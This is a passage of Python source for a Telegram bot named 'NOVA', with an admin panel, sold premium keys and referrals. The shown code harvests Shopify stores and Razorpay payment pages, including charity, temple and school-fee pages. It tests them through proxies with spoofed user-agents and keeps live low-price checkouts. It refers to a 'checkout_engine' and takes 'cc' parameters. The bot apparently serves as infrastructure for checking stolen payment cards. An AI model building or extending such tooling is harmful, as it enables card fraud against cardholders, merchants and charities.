💡 {bs('Contact')} <a href='https://t.me/{OWNER_TAG.lstrip("@")}'>{OWNER_TAG}</a>""")
    kb = [
        [pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
              style="success", icon="📩")],
        [pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")],
    ]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"admin_panel"))
async def cb_admin_panel(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Access denied", alert=True)
    await event.answer()
    text = pe(f"""👑 <b>{bs('Admin Panel')}</b>
{SEP}
📋 <b>{bs('Premium')}</b>
┣ <code>/addpremium user_id [days] [cc]</code>
┣ <code>/removepremium user_id</code>
┗ <code>/listpremium</code>
{SEP}
🔑 <b>{bs('Keys')}</b>
┣ <code>/genkeys n h max cc [price]</code>
┣ <code>/listkeys</code>
┗ <code>/delkey NOVA_XXXX</code>
{SEP}
🎁 <b>{bs('Referrals')}</b>
┣ <code>/refstats</code> · <code>/refgive user_id</code>
┗ <code>/refreset user_id</code>
{SEP}
👑 <b>{bs('Admin')}</b>
┣ <code>/addadmin user_id</code>
┗ <code>/removeadmin user_id</code>
{SEP}
🌐 <b>{bs('Sites')}</b>
┣ <code>/addsites</code> · <code>/resetsites</code> · <code>/site</code>
┣ <code>/addrzsites</code> · <code>/resetrzsites</code> · <code>/rzscan</code>
┣ <code>/shscan</code> · <code>/shharvest</code> · <code>/rzharvest</code>
┣ <code>/fetshsites N [keyword]</code>
┣ <code>/fetrzsites N [keyword]</code>
┗ <code>/setthreshold 7</code> · <code>/setminprice 0.01</code>
{SEP}
📊 <b>{bs('Bot')}</b>
┣ <code>/stats</code> · <code>/status</code> · <code>/ping</code>
┣ <code>/api</code> · <code>/version</code>
┣ <code>/diag</code>
┣ <code>/toggle</code>
┗ <code>/all message</code>""")
    buttons = [[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=buttons, parse_mode='html', link_preview=False)
    except Exception:
        pass


# ====================== BACKGROUND LOOPS ======================
async def premium_cleanup_loop():
    while True:
        await asyncio.sleep(3600)
        try:
            data = load_premium_users()
            now = datetime.now().timestamp()
            changed = False
            for uid, info in list(data.items()):
                if isinstance(info, dict):
                    exp = info.get('expiry')
                    if exp and now > float(exp):
                        del data[uid]
                        changed = True
            if changed:
                save_premium_users(data)
        except Exception as e:
            log_system("CLEANUP", f"premium cleanup: {e}", "error")


async def stats_loop():
    interval = 7200 if os.getenv("RAILWAY_ENVIRONMENT") else 21600
    while True:
        await asyncio.sleep(interval)
        try:
            log_system("STATS",
                       f"users={len(load_premium_users())} "
                       f"sh_sites={len(load_sites())} "
                       f"rz_sites={len(load_rz_sites())}")
        except Exception:
            pass


# =============================================================================
# SELF-CONTAINED SITE FETCHERS
# =============================================================================

_DEFAULT_KEYWORD_STEMS = [
    "coffee", "tea", "candle", "candles", "soap", "skincare", "beauty",
    "cosmetics", "fashion", "clothing", "apparel", "shoes", "jewelry",
    "accessories", "bags", "watches", "home", "kitchen", "bedding",
    "furniture", "decor", "art", "prints", "posters", "toys", "kids",
    "baby", "pets", "dog", "cat", "fitness", "sports", "outdoor",
    "camping", "garden", "plants", "succulents", "tech", "gadgets",
    "electronics", "books", "stationery", "snacks", "food", "drinks",
    "wine", "beer", "supplements", "vitamins", "protein", "roasters",
    "boutique", "vintage", "modern", "organic", "natural", "handmade",
    "luxury", "minimalist", "sustainable", "eco", "wellness", "selfcare",
]

_SHOPIFY_DIRECTORY_URLS = [
    "https://shop.app/api/search",
    "https://shop.app/api/storefronts",
]

_RZ_SLUG_HINTS = [
    "donate", "donation", "pay", "payment", "payments", "paynow",
    "checkout", "fees", "fee", "booking", "book", "order", "store",
    "shop", "buy", "buynow", "cart", "subscription", "subscribe",
    "register", "registration", "ticket", "tickets", "entry",
    "course", "schoolfees", "collegefees", "tuitionfees",
    "support", "supportus", "seva", "daan", "help", "sponsor",
    "fund", "temple", "church", "mandir", "ashram", "trust",
    "foundation", "ngo", "charity", "welfare",
    "trial", "starter", "basic", "premium", "annual", "monthly",
]


def _walk_for_urls(obj, depth: int = 0):
    """Recursively yield any string that looks like a URL or a bare domain."""
    if depth > 6:
        return
    if isinstance(obj, str):
        if "myshopify.com" in obj or (obj.startswith("http") and "." in obj):
            yield obj
        return
    if isinstance(obj, dict):
        for v in obj.values():
            yield from _walk_for_urls(v, depth + 1)
    elif isinstance(obj, list):
        for v in obj:
            yield from _walk_for_urls(v, depth + 1)


def _normalize_shopify_domain(raw: str) -> str:
    """Return a clean domain (no scheme, no path) or '' if unusable."""
    if not raw:
        return ""
    s = str(raw).strip().lower()
    s = re.sub(r'^https?://', '', s)
    s = s.rstrip('/').split('/')[0].split('?')[0]
    if s.startswith('www.'):
        s = s[4:]
    if not s or '.' not in s:
        return ""
    if not re.match(r'^[a-z0-9]([a-z0-9\-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]*[a-z0-9])?)+$', s):
        return ""
    return s


async def _fetch_shopify_stores(keyword: str = "", count: int = 200) -> list:
    """
    Build a candidate list of Shopify store domains.

    Path A — hit Shopify's public storefront directory (shop.app). If it
             responds cleanly, harvest URLs from its JSON walk.
    Path B — fall back to probing {stem}.myshopify.com slug patterns
             (with keyword expansion when a keyword is supplied).

    Returns a deduplicated list of domain strings (no scheme, no path).
    """
    seen = set()
    out = []

    # --- Path A: shop.app directory ---
    try:
        kw = keyword.strip().lower() or random.choice(_DEFAULT_KEYWORD_STEMS)
        params = {"query": kw, "limit": min(count, 250)}
        session = await get_http_session()
        for url in _SHOPIFY_DIRECTORY_URLS:
            if len(out) >= count:
                break
            try:
                async with session.get(
                    url, params=params,
                    timeout=aiohttp.ClientTimeout(total=15),
                    headers={"User-Agent": random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                    ])}
                ) as r:
                    if r.status != 200:
                        continue
                    try:
                        data = await r.json(content_type=None)
                    except Exception:
                        continue
                    for u in _walk_for_urls(data):
                        d = _normalize_shopify_domain(u)
                        if d and d not in seen:
                            seen.add(d)
                            out.append(d)
                            if len(out) >= count:
                                break
            except Exception:
                continue
    except Exception:
        pass

    # --- Path B: myshopify slug probing (top-up) ---
    if len(out) < count:
        stems = list(_DEFAULT_KEYWORD_STEMS)
        if keyword:
            kw = re.sub(r'[^a-z0-9\-]', '', keyword.lower())
            if kw:
                stems = [kw] + [f"{kw}{s}" for s in ("shop", "store", "co", "official", "ind", "us", "uk")] + stems
        suffixes = ["", "shop", "store", "co", "official", "india", "us", "uk"]
        for stem in stems:
            if len(out) >= count:
                break
            stem = re.sub(r'[^a-z0-9\-]', '', stem.lower())
            if not stem:
                continue
            for suf in suffixes:
                if len(out) >= count:
                    break
                slug = f"{stem}{suf}" if suf else stem
                d = f"{slug}.myshopify.com"
                if d not in seen:
                    seen.add(d)
                    out.append(d)

    return out[:count]


async def _fetch_rz_stores(keyword: str = "", count: int = 100) -> list:
    """
    Build a candidate list of https://pages.razorpay.com/<slug> URLs from:
      - existing rz_sites.txt (re-harvest slugs)
      - common slug hints (optionally keyword-expanded)
      - generic iic<city> style slugs some pages use

    Returns full URLs. Validation happens in the command handler.
    """
    seen = set()
    out = []

    try:
        for u in load_rz_sites():
            slug = u.rstrip("/").split("/")[-1]
            slug = re.sub(r'[^a-zA-Z0-9\-_]', '', slug)
            if slug:
                full = f"https://pages.razorpay.com/{slug}"
                if full not in seen:
                    seen.add(full)
                    out.append(full)
    except Exception:
        pass

    hints = list(_RZ_SLUG_HINTS)
    if keyword:
        kw = re.sub(r'[^a-z0-9\-]', '', keyword.lower())
        if kw:
            hints = [kw] + [f"{kw}{s}" for s in ("now", "pay", "donate", "page", "-pay")] + hints

    for slug in hints:
        if len(out) >= count:
            break
        u = f"https://pages.razorpay.com/{slug}"
        if u not in seen:
            seen.add(u)
            out.append(u)

    for city in ["delhi", "mumbai", "bangalore", "chennai", "kolkata",
                 "pune", "hyderabad", "jaipur", "ahmedabad"]:
        if len(out) >= count:
            break
        u = f"https://pages.razorpay.com/iic{city}"
        if u not in seen:
            seen.add(u)
            out.append(u)

    return out[:count]


# ====================== /fetshsites ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]fetshsites(?:\s+(\d+))?(?:\s+(.+))?$'))
async def cmd_fetshsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    m = event.pattern_match
    count = int(m.group(1)) if m.group(1) else 200
    count = max(10, min(count, 2000))
    keyword = (m.group(2) or "").strip()

    kw_disp = f" · keyword: <code>{keyword}</code>" if keyword else ""
    status_msg = await styled_reply(event, pe(
        f"💎 <b>{bs('Fetching Shopify stores')}</b>\n{SEP}\n"
        f"🎯 {bs('Target')}: <code>{count}</code>{kw_disp}"
    ))

    try:
        candidates = await _fetch_shopify_stores(keyword=keyword, count=count)
        if not candidates:
            return await styled_edit(status_msg, pe(
                f"💎 <b>{bs('No candidates fetched')}</b>"
            ))

        proxies = load_user_proxies(uid) or []
        proxy = proxies[0] if proxies else None
        sem = get_user_sem(uid, "site")
        alive = []
        checked = 0
        last_edit = [0.0]

        async def _check_one(dom):
            nonlocal checked
            site = f"https://{dom}"
            async with sem:
                try:
                    res = await test_site_with_price(site, proxy)
                except Exception:
                    res = {"status": "dead"}
            checked += 1
            if res.get("status") in ("alive", "over"):
                alive.append(dom)
            if time.time() - last_edit[0] > 2.0:
                last_edit[0] = time.time()
                try:
                    await styled_edit(status_msg, pe(
                        f"💎 <b>{bs('Fetching + testing')}</b>\n{SEP}\n"
                        f"📊 <code>{checked}/{len(candidates)}</code>\n"
                        f"✅ {bs('Alive')}: <code>{len(alive)}</code>"
                    ))
                except Exception:
                    pass

        for i in range(0, len(candidates), SITE_PER_USER_WORKERS):
            batch = candidates[i:i + SITE_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(d) for d in batch], return_exceptions=True)

        existing = set(load_sites())
        added = 0
        for d in alive:
            if d not in existing:
                existing.add(d)
                added += 1
        if added:
            save_sites(list(existing))

        await styled_edit(status_msg, pe(
            f"✅ <b>{bs('Fetch complete')}</b>\n{SEP}\n"
            f"📥 {bs('Fetched')}: <code>{len(candidates)}</code>\n"
            f"✅ {bs('Alive')}: <code>{len(alive)}</code>\n"
            f"➕ {bs('Newly added')}: <code>{added}</code>\n"
            f"📁 {bs('Total sites.txt')}: <code>{len(load_sites())}</code>"
        ))
        cleanup_user_sem(uid)
    except Exception as e:
        await styled_edit(status_msg, pe(
            f"💎 <b>{bs('Error')}</b>: <code>{str(e)[:120]}</code>"
        ))


# ====================== /fetrzsites ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]fetrzsites(?:\s+(\d+))?(?:\s+(.+))?$'))
async def cmd_fetrzsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    m = event.pattern_match
    count = int(m.group(1)) if m.group(1) else 100
    count = max(10, min(count, 500))
    keyword = (m.group(2) or "").strip()

    kw_disp = f" · keyword: <code>{keyword}</code>" if keyword else ""
    status_msg = await styled_reply(event, pe(
        f"💎 <b>{bs('Fetching Razorpay sites')}</b>\n{SEP}\n"
        f"🎯 {bs('Target')}: <code>{count}</code>{kw_disp}"
    ))

    try:
        candidates = await _fetch_rz_stores(keyword=keyword, count=count)
        if not candidates:
            return await styled_edit(status_msg, pe(
                f"💎 <b>{bs('No candidates')}</b>"
            ))

        if not RZ_HARVESTER_OK:
            return await styled_edit(status_msg, pe(
                f"💎 <b>{bs('RZ harvester missing')}</b>: <code>{_RZ_HARVEST_ERR}</code>"
            ))

        proxies = load_user_proxies(uid) or []
        proxy = proxies[0] if proxies else None

        tmp_src = f".rz_cand_{uid}.txt"
        with open(tmp_src, "w", encoding="utf-8") as f:
            for u in candidates:
                f.write(u + "\n")

        loop = asyncio.get_running_loop()
        last_edit = [0.0]

        def _progress(done, total, result):
            if time.time() - last_edit[0] < 2.0 and done != total:
                return
            last_edit[0] = time.time()
            tag = "✅" if result.get("ok") else "❌"
            short = result.get("url", "")[-40:]
            asyncio.run_coroutine_threadsafe(
                styled_edit(status_msg, pe(
                    f"💎 <b>{bs('Scanning RZ')}</b> [{done}/{total}]\n"
                    f"{tag} <code>{short}</code>"
                )),
                loop,
            )

        live, dead, errors = await loop.run_in_executor(
            None, _rz_scan_file, tmp_src, tmp_src, proxy, 30, _progress
        )
        try:
            os.remove(tmp_src)
        except Exception:
            pass

        existing = set(load_rz_sites())
        added = 0
        for u in live:
            if u not in existing:
                existing.add(u)
                added += 1
        if added:
            save_rz_sites(list(existing))

        await styled_edit(status_msg, pe(
            f"✅ <b>{bs('RZ fetch complete')}</b>\n{SEP}\n"
            f"📥 {bs('Tested')}: <code>{len(candidates)}</code>\n"
            f"✅ {bs('Live')}: <code>{len(live)}</code>\n"
            f"➕ {bs('Newly added')}: <code>{added}</code>\n"
            f"📁 {bs('Total rz_sites.txt')}: <code>{len(load_rz_sites())}</code>"
        ))
    except Exception as e:
        await styled_edit(status_msg, pe(
            f"💎 <b>{bs('Error')}</b>: <code>{str(e)[:120]}</code>"
        ))


# ====================== MAIN ======================
async def main():
    global client_instance
    client_instance = client

    try:
        os.makedirs(VIDEO_DIR, exist_ok=True)
    except Exception:
        pass

    _load_admins()

    log_system("BOOT", "Starting NOVA bot v6.4.0 (API-LESS dual engine)...")
    log_system("BOOT", f"checkout_engine loaded: {CHECKOUT_ENGINE_OK}")
    log_system("BOOT", f"razorpay_engine loaded: {RAZORPAY_ENGINE_OK}")
    log_system("BOOT", f"shopify_harvester loaded: {SHOPIFY_HARVESTER_OK}")
    log_system("BOOT", f"rz_harvester loaded: {RZ_HARVESTER_OK}")
    log_system("BOOT", f"engine proxy check: {ENGINE_PROXY_CHECK_OK}")
    log_system("BOOT", f"admins loaded: {ADMIN_ID}")

    if not BOT_TOKEN:
        log_system("BOOT", "BOT_TOKEN env var not set — aborting", "error")
        return

    if not os.path.exists(PREMIUM_USERS_FILE):
        save_premium_users({str(uid): None for uid in ADMIN_ID})
    if not os.path.exists(USER_PROXIES_FILE):
        _write_json(USER_PROXIES_FILE, {})
    if not os.path.exists(KEYS_FILE):
        _write_json(KEYS_FILE, {})
    if not os.path.exists(RANK_FILE):
        _write_json(RANK_FILE, {})
    if not os.path.exists(SITES_FILE):
        open(SITES_FILE, 'a').close()
    if not os.path.exists(RZ_SITES_FILE):
        open(RZ_SITES_FILE, 'a').close()
    if not os.path.exists(SETTINGS_FILE):
        save_settings({"maintenance": False, "threshold": 7.00, "min_price": 0.01})
    if not os.path.exists(REFERRALS_FILE):
        save_referrals({"users": {}, "codes": {}})
    if not os.path.exists(STREAKS_FILE):
        _write_json(STREAKS_FILE, {})
    if not os.path.exists(PREMIUM_DAILY_FILE):
        _write_json(PREMIUM_DAILY_FILE, {})
    if not os.path.exists(USER_LIMITS_FILE):
        _write_json(USER_LIMITS_FILE, {})
    if not os.path.exists(SITE_STATS_FILE):
        _write_json(SITE_STATS_FILE, {})

    asyncio.create_task(premium_cleanup_loop())
    asyncio.create_task(stats_loop())

    while True:
        try:
            log_system("BOOT", "Connecting...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ NOVA bot online.")
            me = await client.get_me()
            log_system("BOOT", f"  bot=@{me.username}  id={me.id}")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds + 5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{type(e).__name__}: {e}", "error")
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())
